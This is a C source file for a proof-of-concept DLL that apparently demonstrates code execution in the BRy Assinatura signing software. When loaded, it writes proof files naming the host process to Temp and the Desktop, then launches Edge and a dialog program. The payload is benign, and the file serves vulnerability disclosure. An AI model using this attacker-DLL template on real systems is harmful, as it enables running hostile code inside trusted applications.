#include <windows.h>
static HINSTANCE g_self;
static char g_loadfrom[MAX_PATH];
static void drop(const char *path, const char *line){
    HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE){ DWORD w; WriteFile(h, line, lstrlenA(line), &w, NULL); CloseHandle(h); }
}
static void spawn(char *cmdline){
    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof si); si.cb = sizeof si; ZeroMemory(&pi, sizeof pi);
    if (CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)){
        CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    }
}
static DWORD WINAPI worker(LPVOID u){
    (void)u;
    char edge[]  = "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" "
                   "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    char dlg[]   = "\"C:\\Users\\vuln\\Desktop\\demo\\bry\\brymsg.exe\"";
    spawn(edge);
    spawn(dlg);   /* standalone dialog: survives the native host tearing down */
    return 0;
}
static void proof(void){
    char exe[MAX_PATH]; exe[0]=0; GetModuleFileNameA(NULL, exe, MAX_PATH);
    char cwd[MAX_PATH]; cwd[0]=0; GetCurrentDirectoryA(MAX_PATH, cwd);
    GetModuleFileNameA(g_self, g_loadfrom, MAX_PATH);
    char line[900];
    wsprintfA(line,
        "BRy Assinatura - PROOF OF NATIVE CODE EXECUTION\r\n"
        "Attacker-chosen DLL loaded + executed inside:\r\n  %s\r\n"
        "Host PID: %lu\r\nHost CWD: %s\r\nLoaded from: %s\r\n",
        exe, (unsigned long)GetCurrentProcessId(), cwd, g_loadfrom);
    char p[MAX_PATH]; DWORD n = GetTempPathA(MAX_PATH, p);
    if (n && n <= MAX_PATH){ lstrcatA(p, "BRY_RCE_POC_PROOF.txt"); drop(p, line); }
    char prof[MAX_PATH];
    if (GetEnvironmentVariableA("USERPROFILE", prof, MAX_PATH)){
        char d[MAX_PATH]; wsprintfA(d, "%s\\Desktop\\BRY_RCE_POC_PROOF.txt", prof); drop(d, line);
    }
}
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID r){
    (void)r;
    if (reason == DLL_PROCESS_ATTACH){ g_self=hinst; proof(); CreateThread(NULL,0,worker,NULL,0,NULL); }
    return TRUE;
}
